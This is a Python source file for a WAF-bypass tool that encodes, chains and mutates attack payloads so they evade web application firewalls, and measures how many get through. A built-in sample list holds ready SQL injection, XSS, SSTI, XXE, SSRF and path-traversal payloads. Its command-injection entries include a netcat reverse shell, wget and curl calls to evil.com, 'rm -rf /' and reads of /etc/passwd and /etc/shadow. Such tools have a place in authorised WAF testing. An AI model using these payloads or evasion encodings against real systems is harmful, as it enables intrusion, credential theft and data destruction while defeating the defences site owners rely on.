"""
payload_encoder.py
author: Prashant Sharma
started: Jan 2026, last major rewrite: Mar 2026

Core encoding/obfuscation engine for WAF bypass testing.
Began as a 200-line script, grew from there.

Nothing fancy—just a bunch of string transforms plus a decoder
for reversing them. The mutation stuff came later when I realized
encoding alone wasn't enough for modern WAFs.

NOTE: ROT47 support added (Mar 2026)
NOTE: null-byte injection edge case test added (Mar 2026)
NOTE: base64+url chain catches a surprising number of WAFs
"""

import base64
import html
import random
import string
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# dataclasses make the API responses cleaner — used to just return dicts

@dataclass
class EncodedPayload:
    """Represents a single encoded payload variant."""
    original: str
    encoded: str
    techniques_applied: List[str]
    encoding_depth: int = 1
    label: str = ""

    def to_dict(self) -> dict:
        return {
            "original": self.original,
            "encoded": self.encoded,
            "techniques_applied": self.techniques_applied,
            "encoding_depth": self.encoding_depth,
            "label": self.label,
        }


@dataclass
class EvasionResult:
    """Result of testing a payload against WAF."""
    payload: EncodedPayload
    detected: bool
    matched_rules: List[dict] = field(default_factory=list)
    confidence: float = 0.0

    def to_dict(self) -> dict:
        return {
            "payload": self.payload.to_dict(),
            "detected": self.detected,
            "matched_rules": self.matched_rules,
            "confidence": self.confidence,
            "status": "BLOCKED" if self.detected else "BYPASSED",
        }


@dataclass
class EvasionReport:
    """Summary report of batch evasion testing."""
    total_tested: int
    total_blocked: int
    total_bypassed: int
    evasion_rate: float
    results: List[EvasionResult] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "total_tested": self.total_tested,
            "total_blocked": self.total_blocked,
            "total_bypassed": self.total_bypassed,
            "evasion_rate": round(self.evasion_rate, 2),
            "results": [r.to_dict() for r in self.results],
        }


# ── Sample Payloads ──────────────────────────────────────────

SAMPLE_PAYLOADS = {
    "sqli": [
        "' OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "admin' --",
        "1'; DROP TABLE users --",
        "' OR ''='",
        "1' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables --",
        "' OR 'x'='x",
        "1' ORDER BY 1--+",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'/*",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<details open ontoggle=alert(1)>",
    ],
    "cmdi": [
        "; ls -la",
        "| cat /etc/passwd",
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "; wget http://evil.com/shell.sh",
        "&& curl http://evil.com/exfil",
        "| python -c 'import os; os.system(\"id\")'",
        "; echo vulnerable > /tmp/pwned",
    ],
    "path_traversal": [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/proc/self/environ",
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "....\\....\\boot.ini",
        "%252e%252e%252fetc%252fpasswd",
        "/etc/shadow",
    ],
    "header_injection": [
        "%0d%0aSet-Cookie: admin=true",
        "\r\nX-Injected: true",
        "%0d%0aContent-Length: 0%0d%0a",
        "%0aSet-Cookie:%20admin=1",
        "x%0d%0aHTTP/1.1 200 OK%0d%0a",
        "%0d%0aLocation: http://evil.com",
        "%0d%0aTransfer-Encoding: chunked%0d%0a",
        "%0aX-Forwarded-For: 127.0.0.1",
        "%0d%0aAccess-Control-Allow-Origin: *",
        "value%0d%0aSet-Cookie: session=hijacked; HttpOnly",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "file:///etc/passwd",
        "http://[::1]/admin",
        "http://0x7f000001/",
        "http://2130706433/",
        "dict://localhost:11211/stat",
        "gopher://localhost:25/_MAIL FROM:attacker@evil.com",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ],
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><root>&xxe;</root>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]>",
        "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/shadow'>]><data>&file;</data>",
        "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><x>&xxe;</x>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/steal.xml'>%remote;]>",
        "<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>",
        "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;'>]>",
        "<![CDATA[<script>alert(1)</script>]]>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>",
    ],
    "ldap_injection": [
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*()|&'",
        "admin*)((|userPassword=*)",
        "*)(|(objectClass=*)",
        ")(cn=*))(|(cn=*",
        "admin))(|(uid=*",
        "*)(mail=*)(|(mail=*",
        "*))(objectClass=*",
        "\\2a)(uid=*))(|(uid=\\2a",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{% for x in [].class.base.subclasses() %}{% if 'warning' in x.name %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
        "https:evil.com",
        "//evil%2ecom",
        "/%09/evil.com",
        "/\t/evil.com",
        "https://legit.com@evil.com",
        "javascript:window.location='http://evil.com'",
        "%2f%2fevil.com",
    ],
}


# ── Encoding Techniques ──────────────────────────────────────

class EncodingTechnique:
    """Descriptor for a single encoding technique."""

    def __init__(self, technique_id: str, name: str, description: str,
                 category: str, risk_level: str):
        self.technique_id = technique_id
        self.name = name
        self.description = description
        self.category = category
        self.risk_level = risk_level  # low, medium, high

    def to_dict(self) -> dict:
        return {
            "id": self.technique_id,
            "name": self.name,
            "description": self.description,
            "category": self.category,
            "risk_level": self.risk_level,
        }


TECHNIQUES_REGISTRY: List[EncodingTechnique] = [
    EncodingTechnique("url_encode", "URL Encoding",
                      "Encode special characters as %XX hex sequences",
                      "encoding", "medium"),
    EncodingTechnique("double_url_encode", "Double URL Encoding",
                      "Apply URL encoding twice (%25XX) to bypass single-decode filters",
                      "encoding", "high"),
    EncodingTechnique("unicode_encode", "Unicode Encoding",
                      "Replace characters with \\uXXXX Unicode escape sequences",
                      "encoding", "high"),
    EncodingTechnique("html_entity_encode", "HTML Entity Encoding",
                      "Convert characters to &#xNN; HTML hex entities",
                      "encoding", "medium"),
    EncodingTechnique("base64_encode", "Base64 Encoding",
                      "Encode entire payload as Base64 string",
                      "encoding", "medium"),
    EncodingTechnique("hex_encode", "Hex Encoding",
                      "Replace characters with \\xNN or 0xNN hex notation",
                      "encoding", "medium"),
    EncodingTechnique("case_alternate", "Case Alternation",
                      "Randomize character casing (sElEcT, UnIoN) to evade case-sensitive rules",
                      "obfuscation", "low"),
    EncodingTechnique("comment_inject", "SQL Comment Injection",
                      "Insert inline SQL comments (/**/) between keywords",
                      "obfuscation", "high"),
    EncodingTechnique("whitespace_obfuscate", "Whitespace Obfuscation",
                      "Replace spaces with tabs, newlines, or %09/%0a/%0d sequences",
                      "obfuscation", "medium"),
    EncodingTechnique("concat_split", "Concatenation / Splitting",
                      "Split keywords using string concatenation (CON+'CAT') or CHAR() building",
                      "obfuscation", "high"),
    EncodingTechnique("rot47_encode", "ROT47 Encoding",
                      "Rotate printable ASCII characters by 47 positions to obfuscate payloads",
                      "encoding", "medium"),
    EncodingTechnique("overlong_utf8", "Overlong UTF-8 Encoding",
                      "Encode ASCII chars as overlong 2-byte UTF-8 sequences (%C0%XX) to confuse decoders",
                      "encoding", "high"),
    EncodingTechnique("json_unicode", "JSON Unicode Escape",
                      "Encode every character as JSON \\uXXXX — useful for bypassing JSON parsers",
                      "encoding", "medium"),
    EncodingTechnique("keyword_split_enc", "Keyword Split Encoding",
                      "Insert zero-width spaces or versioned SQL comments inside keywords (SEL/**/ECT)",
                      "obfuscation", "high"),
    EncodingTechnique("decimal_encode", "Decimal Entity Encoding",
                      "Encode each character as its decimal HTML entity (&#78; style)",
                      "encoding", "medium"),
    EncodingTechnique("xss_polyglot", "XSS Polyglot Wrapper",
                      "Wrap JS payload in a multi-context polyglot string (works in attr/tag/script context)",
                      "obfuscation", "high"),
    EncodingTechnique("space_to_tab", "Space to Tab Substitution",
                      "Replace all spaces with tab characters (%09) to evade space-sensitive WAF rules",
                      "obfuscation", "low"),
]


# ── Payload Encoder Engine ────────────────────────────────────

class PayloadEncoder:
    """Main payload encoding and obfuscation engine.

    Supports 10+ encoding techniques with chaining,
    variant generation, and WAF evasion testing.
    """

    def __init__(self):
        self._techniques = {t.technique_id: t for t in TECHNIQUES_REGISTRY}
        self._encode_functions = {
            "url_encode": self._url_encode,
            "double_url_encode": self._double_url_encode,
            "unicode_encode": self._unicode_encode,
            "html_entity_encode": self._html_entity_encode,
            "base64_encode": self._base64_encode,
            "hex_encode": self._hex_encode,
            "case_alternate": self._case_alternate,
            "comment_inject": self._comment_inject,
            "whitespace_obfuscate": self._whitespace_obfuscate,
            "concat_split": self._concat_split,
            "rot47_encode": self._rot47_encode,
            "overlong_utf8": self._overlong_utf8,
            "json_unicode": self._json_unicode,
            "keyword_split_enc": self._keyword_split_enc,
            "decimal_encode": self._decimal_encode,
            "xss_polyglot": self._xss_polyglot,
            "space_to_tab": self._space_to_tab,
        }
        self._history: List[EncodedPayload] = []

    # ── Public API ────────────────────────────────────────────

    def get_techniques(self) -> List[dict]:
        """Return list of all available encoding techniques."""
        return [t.to_dict() for t in TECHNIQUES_REGISTRY]

    def get_sample_payloads(self, category: str = "all") -> Dict[str, List[str]]:
        """Return sample payloads by category."""
        if category == "all":
            return SAMPLE_PAYLOADS
        return {category: SAMPLE_PAYLOADS.get(category, [])}

    def encode(self, payload: str, technique: str) -> EncodedPayload:
        """Apply a single encoding technique to a payload.

        Args:
            payload: Raw attack payload string
            technique: Technique ID from TECHNIQUES_REGISTRY

        Returns:
            EncodedPayload with the encoded result
        """
        if technique not in self._encode_functions:
            raise ValueError(f"Unknown technique: {technique}. "
                           f"Available: {list(self._encode_functions.keys())}")

        encoded = self._encode_functions[technique](payload)
        result = EncodedPayload(
            original=payload,
            encoded=encoded,
            techniques_applied=[technique],
            encoding_depth=1,
            label=self._techniques[technique].name,
        )
        self._history.append(result)
        return result

    def chain_encode(self, payload: str, techniques: List[str]) -> EncodedPayload:
        """Apply multiple encoding techniques in sequence.

        Each technique is applied to the output of the previous one.

        Args:
            payload: Raw attack payload string
            techniques: Ordered list of technique IDs to apply

        Returns:
            EncodedPayload with the final chained result
        """
        current = payload
        for tech in techniques:
            if tech not in self._encode_functions:
                raise ValueError(f"Unknown technique: {tech}")
            current = self._encode_functions[tech](current)

        labels = [self._techniques[t].name for t in techniques]
        result = EncodedPayload(
            original=payload,
            encoded=current,
            techniques_applied=list(techniques),
            encoding_depth=len(techniques),
            label=" → ".join(labels),
        )
        self._history.append(result)
        return result

    def generate_variants(self, payload: str, count: int = 10,
                          techniques: Optional[List[str]] = None) -> List[EncodedPayload]:
        """Auto-generate diverse encoded variants of a payload.

        Args:
            payload: Raw attack payload
            count: Number of variants to generate
            techniques: Specific techniques to use (None = all)

        Returns:
            List of EncodedPayload variants
        """
        available = techniques or list(self._encode_functions.keys())
        variants: List[EncodedPayload] = []
        seen = set()

        # Single-technique variants
        for tech in available:
            if len(variants) >= count:
                break
            try:
                result = self.encode(payload, tech)
                if result.encoded not in seen:
                    seen.add(result.encoded)
                    variants.append(result)
            except Exception:
                continue

        # Chained variants (2 techniques) — only if we have at least 2 to combine
        if len(variants) < count and len(available) >= 2:
            for _ in range(count * 3):  # attempt more to fill quota
                if len(variants) >= count:
                    break
                chain_len = random.randint(2, min(3, len(available)))
                chain = random.sample(available, chain_len)
                try:
                    result = self.chain_encode(payload, chain)
                    if result.encoded not in seen:
                        seen.add(result.encoded)
                        variants.append(result)
                except Exception:
                    continue

        return variants[:count]

    def test_against_waf(self, payload: str, waf_engine) -> EvasionResult:
        """Test a single payload against a WAF engine instance.

        Args:
            payload: The (possibly encoded) payload string
            waf_engine: WAFEngine instance with .inspect() method

        Returns:
            EvasionResult with detection status
        """
        result = waf_engine.inspect(
            method="GET",
            url=f"/test?input={payload}",
            query_params={"input": payload},
            body=payload,
        )

        encoded_payload = EncodedPayload(
            original=payload, encoded=payload,
            techniques_applied=["raw"], label="Raw Payload",
        )

        return EvasionResult(
            payload=encoded_payload,
            detected=not result.allowed,
            matched_rules=result.matched_rules,
            confidence=result.highest_confidence,
        )

    def batch_test(self, variants: List[EncodedPayload],
                   waf_engine) -> EvasionReport:
        """Test multiple encoded variants against a WAF engine.

        Args:
            variants: List of EncodedPayload to test
            waf_engine: WAFEngine instance

        Returns:
            EvasionReport with full summary
        """
        results: List[EvasionResult] = []

        for variant in variants:
            waf_result = waf_engine.inspect(
                method="GET",
                url=f"/test?input={variant.encoded}",
                query_params={"input": variant.encoded},
                body=variant.encoded,
            )

            ev_result = EvasionResult(
                payload=variant,
                detected=not waf_result.allowed,
                matched_rules=waf_result.matched_rules,
                confidence=waf_result.highest_confidence,
            )
            results.append(ev_result)

        total = len(results)
        blocked = sum(1 for r in results if r.detected)
        bypassed = total - blocked
        rate = (bypassed / total * 100) if total > 0 else 0.0

        return EvasionReport(
            total_tested=total,
            total_blocked=blocked,
            total_bypassed=bypassed,
            evasion_rate=rate,
            results=results,
        )

    def get_history(self, limit: int = 50) -> List[dict]:
        """Return recent encoding history."""
        return [p.to_dict() for p in self._history[-limit:]]

    def clear_history(self):
        """Clear encoding history."""
        self._history.clear()

    # ── Encoding Implementations ──────────────────────────────

    @staticmethod
    def _url_encode(payload: str) -> str:
        """Standard URL encoding (%XX)."""
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def _double_url_encode(payload: str) -> str:
        """Double URL encoding (%25XX)."""
        first = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(first, safe='')

    @staticmethod
    def _unicode_encode(payload: str) -> str:
        r"""Unicode escape encoding (\uXXXX)."""
        result = []
        for char in payload:
            if char.isalnum():
                result.append(char)
            else:
                result.append(f"\\u{ord(char):04x}")
        return "".join(result)

    @staticmethod
    def _html_entity_encode(payload: str) -> str:
        """HTML hex entity encoding (&#xNN;)."""
        result = []
        for char in payload:
            if char.isalnum():
                result.append(char)
            else:
                result.append(f"&#{ord(char)};")
        return "".join(result)

    @staticmethod
    def _base64_encode(payload: str) -> str:
        """Base64 encoding."""
        return base64.b64encode(payload.encode('utf-8')).decode('ascii')

    @staticmethod
    def _hex_encode(payload: str) -> str:
        r"""Hex encoding (\xNN)."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def _case_alternate(payload: str) -> str:
        """Randomly alternate case of alphabetic characters."""
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def _comment_inject(payload: str) -> str:
        """Insert SQL-style inline comments between characters of keywords."""
        # Target common SQL/JS keywords
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
                    'FROM', 'WHERE', 'TABLE', 'OR', 'AND', 'ORDER', 'GROUP',
                    'script', 'alert', 'eval', 'onerror', 'onload']

        result = payload
        for kw in keywords:
            # Case-insensitive replacement
            import re
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            matches = list(pattern.finditer(result))
            for match in reversed(matches):
                original = match.group()
                if len(original) > 2:
                    mid = len(original) // 2
                    commented = original[:mid] + "/**/" + original[mid:]
                    result = result[:match.start()] + commented + result[match.end():]
        return result

    @staticmethod
    def _whitespace_obfuscate(payload: str) -> str:
        """Replace spaces with various whitespace alternatives."""
        alternatives = ['\t', '%09', '%0a', '%0d', '  ', '+']
        result = []
        for char in payload:
            if char == ' ':
                result.append(random.choice(alternatives))
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def _concat_split(payload: str) -> str:
        """Split keywords using string concatenation."""
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
                    'FROM', 'WHERE', 'TABLE', 'script', 'alert', 'eval']

        result = payload
        for kw in keywords:
            import re
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            matches = list(pattern.finditer(result))
            for match in reversed(matches):
                original = match.group()
                if len(original) > 2:
                    mid = len(original) // 2
                    split = f"'{original[:mid]}'+'{original[mid:]}'"
                    result = result[:match.start()] + split + result[match.end():]
        return result

    @staticmethod
    def _rot47_encode(payload: str) -> str:
        """ROT47 encoding — rotates printable ASCII chars (33-126) by 47 positions."""
        result = []
        for char in payload:
            code = ord(char)
            if 33 <= code <= 126:
                result.append(chr(33 + ((code - 33 + 47) % 94)))
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def _overlong_utf8(payload: str) -> str:
        """Overlong UTF-8: encode ASCII chars as 2-byte sequences (%C0%A0 style).
        Many WAF decoders accept these but normalise them differently."""
        result = []
        for char in payload:
            code = ord(char)
            if 32 <= code <= 127:
                # 2-byte overlong: 0xC0 | (code >> 6), 0x80 | (code & 0x3F)
                b1 = 0xC0 | (code >> 6)
                b2 = 0x80 | (code & 0x3F)
                result.append(f"%{b1:02X}%{b2:02X}")
            else:
                result.append(urllib.parse.quote(char, safe=''))
        return "".join(result)

    @staticmethod
    def _json_unicode(payload: str) -> str:
        r"""JSON-style Unicode escape: every character becomes \uXXXX.
        Targets WAFs that don't decode JSON escapes before pattern matching."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def _keyword_split_enc(payload: str) -> str:
        """Split SQL/JS keywords by inserting versioned SQL comments in the middle.
        E.g. SELECT → SEL/*!*/ECT — passes keyword-based regex filters."""
        import re
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
                    'FROM', 'WHERE', 'TABLE', 'SCRIPT', 'ALERT', 'EVAL',
                    'ORDER', 'GROUP', 'HAVING', 'EXEC', 'CAST', 'CONVERT']
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            for match in reversed(list(pattern.finditer(result))):
                orig = match.group()
                mid = len(orig) // 2
                split = orig[:mid] + "/*!*/" + orig[mid:]
                result = result[:match.start()] + split + result[match.end():]
        return result

    @staticmethod
    def _decimal_encode(payload: str) -> str:
        """Decimal HTML entity encoding: each char becomes &#DDD;
        Targets HTML-context WAFs that only check for hex entities."""
        result = []
        for char in payload:
            if char.isalnum():
                result.append(char)
            else:
                result.append(f"&#{ord(char)};")
        return "".join(result)

    @staticmethod
    def _xss_polyglot(payload: str) -> str:
        """Wrap payload in a multi-context XSS polyglot frame.
        The wrapper terminates attribute, script, and style contexts
        before injecting the payload, maximising execution surface."""
        return f"'\"--></style></script><svg/onload='{payload}'>"

    @staticmethod
    def _space_to_tab(payload: str) -> str:
        """Replace all spaces with URL-encoded tab (%09).
        Bypasses space-sensitive keyword matching without breaking SQL/JS semantics."""
        return payload.replace(" ", "%09")


# ── Payload Decoder (Reverse Mode) ────────────────────────────

class PayloadDecoder:
    """Auto-detect encoding type and decode payloads step-by-step.

    Supports reverse operations for all 10 encoding techniques,
    with multi-layer detection and progressive decoding.
    """

    # Detection patterns in priority order.
    # NOTE: ROT47 is last and uses a custom validator, not just a regex pattern,
    # because [!-~]{4,} matches any printable ASCII text (huge false-positive rate).
    DETECTION_RULES = [
        {
            "id": "double_url",
            "name": "Double URL Encoding",
            "pattern": r"%25[0-9a-fA-F]{2}",
            "decode": "_decode_double_url",
            "min_matches": 1,
        },
        {
            "id": "url",
            "name": "URL Encoding",
            "pattern": r"%[0-9a-fA-F]{2}",
            "decode": "_decode_url",
            "min_matches": 1,
        },
        {
            "id": "base64",
            "name": "Base64 Encoding",
            # Must be whole-string match, length % 4 == 0 (or with = padding), min 8 chars
            "pattern": r"(?:^[A-Za-z0-9+/]{8,}={0,2}$)",
            "decode": "_decode_base64",
            "min_matches": 1,
        },
        {
            "id": "hex",
            "name": "Hex Encoding",
            "pattern": r"\\x[0-9a-fA-F]{2}",
            "decode": "_decode_hex",
            "min_matches": 2,
        },
        {
            "id": "unicode",
            "name": "Unicode Encoding",
            "pattern": r"\\u[0-9a-fA-F]{4}",
            "decode": "_decode_unicode",
            "min_matches": 2,
        },
        {
            "id": "html_entity",
            "name": "HTML Entity Encoding",
            "pattern": r"&#\d+;|&#x[0-9a-fA-F]+;",
            "decode": "_decode_html_entity",
            "min_matches": 2,
        },
        {
            "id": "comment_inject",
            "name": "SQL Comment Injection",
            "pattern": r"/\*[^*]*\*/",
            "decode": "_decode_comment",
            "min_matches": 1,
        },
        {
            "id": "concat_split",
            "name": "Concatenation / Splitting",
            "pattern": r"'[^']*'\s*\+\s*'[^']*'",
            "decode": "_decode_concat",
            "min_matches": 1,
        },
        # ROT47 has no reliable single-regex signature; uses a custom heuristic below.
        # The pattern field is a placeholder — actual detection is in detect_encodings.
        {
            "id": "rot47",
            "name": "ROT47 Encoding",
            "pattern": None,   # custom heuristic
            "decode": "_decode_rot47",
            "min_matches": 1,
        },
    ]

    def detect_encodings(self, payload: str) -> List[dict]:
        """Detect all encoding types present in the payload.

        Returns list of detected encodings sorted by confidence (descending).
        ROT47 uses a separate high-precision heuristic to avoid false positives.
        """
        import re
        detections = []

        for rule in self.DETECTION_RULES:
            min_matches = rule.get("min_matches", 1)

            # ------------------------------------------------------------------
            # ROT47 special heuristic: check if a large fraction of the payload
            # consists of "unusual" printable chars (!, ", #, $, %, &, ', (, )
            # i.e. ASCII 33-47). Normal SQL/XSS payloads rarely exceed 15% ratio
            # of these chars; ROT47-encoded text typically pushes 40%+.
            # ------------------------------------------------------------------
            if rule["id"] == "rot47":
                unusual = sum(1 for c in payload if 33 <= ord(c) <= 47)
                ratio = unusual / max(len(payload), 1)
                # Only flag as ROT47 when the unusual-char ratio is high AND
                # no other encoding patterns were detected (avoid false positives
                # on otherwise-encoded payloads that happen to contain some
                # chars in the 33-47 range).
                if ratio >= 0.30 and len(payload) >= 6:
                    confidence = round(min(0.90, ratio * 1.5), 2)
                    detections.append({
                        "id": "rot47",
                        "name": "ROT47 Encoding",
                        "matches_found": unusual,
                        "confidence": confidence,
                        "sample_match": payload[:20],
                    })
                continue

            # Standard regex-based detection
            if rule["pattern"] is None:
                continue

            matches = re.findall(rule["pattern"], payload)
            if len(matches) < min_matches:
                continue

            # --- Confidence scoring ---
            # For whole-string patterns (base64), coverage is 1.0 if it matched;
            # for inline patterns, measure match character coverage.
            if rule["id"] == "base64":
                # Validate length is a multiple of 4 (with = padding)
                stripped = payload.strip()
                padded = stripped + '=' * (-len(stripped) % 4)
                try:
                    base64.b64decode(padded)
                    confidence = 0.80  # solid but not certain (could be random alphanumeric)
                except Exception:
                    confidence = 0.20
            else:
                coverage = len("".join(matches)) / max(len(payload), 1)
                # More matches and higher coverage -> higher confidence.
                match_bonus = min(0.2, len(matches) * 0.04)
                confidence = round(min(0.95, max(0.40, coverage * 1.8 + match_bonus)), 2)

            detections.append({
                "id": rule["id"],
                "name": rule["name"],
                "matches_found": len(matches),
                "confidence": confidence,
                "sample_match": matches[0] if matches else "",
            })

        return sorted(detections, key=lambda d: d["confidence"], reverse=True)

    def decode(self, payload: str, encoding_type: str = "auto") -> dict:
        """Decode a payload, optionally auto-detecting encoding.

        Args:
            payload: Encoded payload string
            encoding_type: Encoding ID or "auto" for auto-detection

        Returns:
            Dict with decoded result and steps taken
        """
        steps = []
        current = payload

        if encoding_type == "auto":
            # Progressive decoding — keep decoding until no changes
            max_iterations = 10
            for i in range(max_iterations):
                detections = self.detect_encodings(current)
                if not detections:
                    break

                best = detections[0]
                decode_fn = getattr(self, best.get("id", ""), None)
                # Use the decode method name from rules
                for rule in self.DETECTION_RULES:
                    if rule["id"] == best["id"]:
                        decode_fn = getattr(self, rule["decode"], None)
                        break

                if decode_fn is None:
                    break

                decoded = decode_fn(current)
                if decoded == current:
                    break  # No change, stop

                steps.append({
                    "step": i + 1,
                    "encoding_detected": best["name"],
                    "confidence": best["confidence"],
                    "input": current,
                    "output": decoded,
                })
                current = decoded
        else:
            # Specific decoding
            decode_method = None
            for rule in self.DETECTION_RULES:
                if rule["id"] == encoding_type:
                    decode_method = getattr(self, rule["decode"], None)
                    break

            if decode_method:
                decoded = decode_method(current)
                steps.append({
                    "step": 1,
                    "encoding_detected": encoding_type,
                    "confidence": 1.0,
                    "input": current,
                    "output": decoded,
                })
                current = decoded

        return {
            "original_input": payload,
            "final_decoded": current,
            "steps": steps,
            "total_layers": len(steps),
            "fully_decoded": len(self.detect_encodings(current)) == 0,
        }

    # ── Decode Implementations ────────────────────────────────

    @staticmethod
    def _decode_url(payload: str) -> str:
        return urllib.parse.unquote(payload)

    @staticmethod
    def _decode_double_url(payload: str) -> str:
        return urllib.parse.unquote(urllib.parse.unquote(payload))

    @staticmethod
    def _decode_base64(payload: str) -> str:
        try:
            # Only decode if it looks like valid base64
            import re
            if re.match(r'^[A-Za-z0-9+/]+=*$', payload.strip()) and len(payload) >= 4:
                decoded = base64.b64decode(payload.strip()).decode('utf-8', errors='replace')
                # Verify it produced readable text
                if any(c.isprintable() for c in decoded):
                    return decoded
        except Exception:
            pass
        return payload

    @staticmethod
    def _decode_hex(payload: str) -> str:
        import re
        def replace_hex(m):
            try:
                return chr(int(m.group(1), 16))
            except (ValueError, OverflowError):
                return m.group(0)
        return re.sub(r'\\x([0-9a-fA-F]{2})', replace_hex, payload)

    @staticmethod
    def _decode_unicode(payload: str) -> str:
        import re
        def replace_unicode(m):
            try:
                return chr(int(m.group(1), 16))
            except (ValueError, OverflowError):
                return m.group(0)
        return re.sub(r'\\u([0-9a-fA-F]{4})', replace_unicode, payload)

    @staticmethod
    def _decode_html_entity(payload: str) -> str:
        import re
        def replace_entity(m):
            text = m.group(0)
            if text.startswith("&#x"):
                try:
                    return chr(int(text[3:-1], 16))
                except (ValueError, OverflowError):
                    return text
            elif text.startswith("&#"):
                try:
                    return chr(int(text[2:-1]))
                except (ValueError, OverflowError):
                    return text
            return text
        return re.sub(r'&#\d+;|&#x[0-9a-fA-F]+;', replace_entity, payload)

    @staticmethod
    def _decode_comment(payload: str) -> str:
        return payload.replace("/**/", "")

    @staticmethod
    def _decode_concat(payload: str) -> str:
        import re
        return re.sub(r"'([^']*)'\s*\+\s*'([^']*)'", r"\1\2", payload)



    @staticmethod
    def _decode_rot47(payload: str) -> str:
        """Decode ROT47 by applying ROT47 again (it is its own inverse)."""
        result = []
        for char in payload:
            code = ord(char)
            if 33 <= code <= 126:
                result.append(chr(33 + ((code - 33 + 47) % 94)))
            else:
                result.append(char)
        return "".join(result)

# ── Payload Mutation Engine ───────────────────────────────────

class PayloadMutator:
    """Advanced payload mutation engine.

    Goes beyond simple encoding to deeply transform payloads using:
    - Keyword synonym replacement
    - Comment padding
    - Numeric obfuscation
    - Char-code building
    - Null byte injection
    - Mixed-technique hybrids
    """

    # SQL keyword synonyms/alternatives
    SQL_SYNONYMS = {
        "SELECT": ["SELECT", "SELECT ALL", "SELECT DISTINCT"],
        "UNION": ["UNION", "UNION ALL", "UNION DISTINCT"],
        "OR": ["OR", "||", "oR"],
        "AND": ["AND", "&&", "aNd"],
        "FROM": ["FROM", "/*!FROM*/"],
        "WHERE": ["WHERE", "/*!WHERE*/"],
        "DROP": ["DROP", "/*!DROP*/"],
        "TABLE": ["TABLE", "/*!TABLE*/"],
        "INSERT": ["INSERT", "/*!INSERT*/"],
        "DELETE": ["DELETE", "/*!DELETE*/"],
        "UPDATE": ["UPDATE", "/*!UPDATE*/"],
    }

    # Numeric equivalences for "1=1"
    NUMERIC_TRUTHS = [
        "1=1", "2>1", "3!=4", "'a'='a'", "1<2",
        "2 BETWEEN 1 AND 3", "1 IN (1,2,3)", "NOT 1=0",
        "CHAR(49)=CHAR(49)", "0x31=0x31",
    ]

    # XSS event handler alternatives
    XSS_EVENTS = [
        "onerror", "onload", "onfocus", "onmouseover",
        "onclick", "onmouseup", "ontoggle", "onblur",
        "onanimationend", "onbeforeinput",
    ]

